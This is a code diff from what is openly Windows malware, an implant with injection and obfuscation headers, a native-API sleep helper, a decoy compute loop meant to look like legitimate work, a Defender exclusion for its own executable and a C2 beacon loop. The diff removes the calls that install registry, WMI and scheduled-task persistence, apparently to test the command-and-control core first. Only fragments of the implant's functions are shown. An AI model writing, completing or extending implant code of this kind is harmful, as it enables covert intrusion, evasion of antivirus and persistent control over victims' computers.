@@ -8,7 +8,6 @@
 #include "injection.hpp"
 #include "obfuscate.hpp"
 
-// NtDelayExecution inline helper
 static void NtSleep(DWORD ms) {
     typedef NTSTATUS (NTAPI *NtDelayExecution_t)(BOOLEAN, PLARGE_INTEGER);
     static NtDelayExecution_t pfn = nullptr;
@@ -28,7 +27,6 @@ static void NtSleep(DWORD ms) {
     }
 }
 
-// Decoy compute loop – looks like legitimate work
 static void DecoyLoop() {
     volatile unsigned long long fib = 1, a = 0, b = 1;
     for (int i = 0; i < 5000000; i++) { fib = a + b; a = b; b = fib; }
@@ -87,16 +85,10 @@ DWORD WINAPI ImplantThread(LPVOID) {
         AddDefenderExclusion(exePath);
     }
 
-    printf("[DEBUG] Installing persistence mechanisms...\n");
-    fflush(stdout);
-    InstallRegistryPersistence(exePath);
-    if (!IsWmiPersistenceInstalled()) {
-        InstallWmiPersistence(exePath);
-    }
-    if (!IsScheduledTaskInstalled()) {
-        InstallScheduledTaskPersistence(exePath);
-    }
-    printf("[DEBUG] Persistence installed\n");
+    // ──────────────────────────────────────────────────────────────
+    //  SKIP PERSISTENCE – we test the C2 core first
+    // ──────────────────────────────────────────────────────────────
+    printf("[DEBUG] Skipping persistence installation for testing.\n");
     fflush(stdout);
 
     printf("[DEBUG] Entering BeaconLoop...\n");
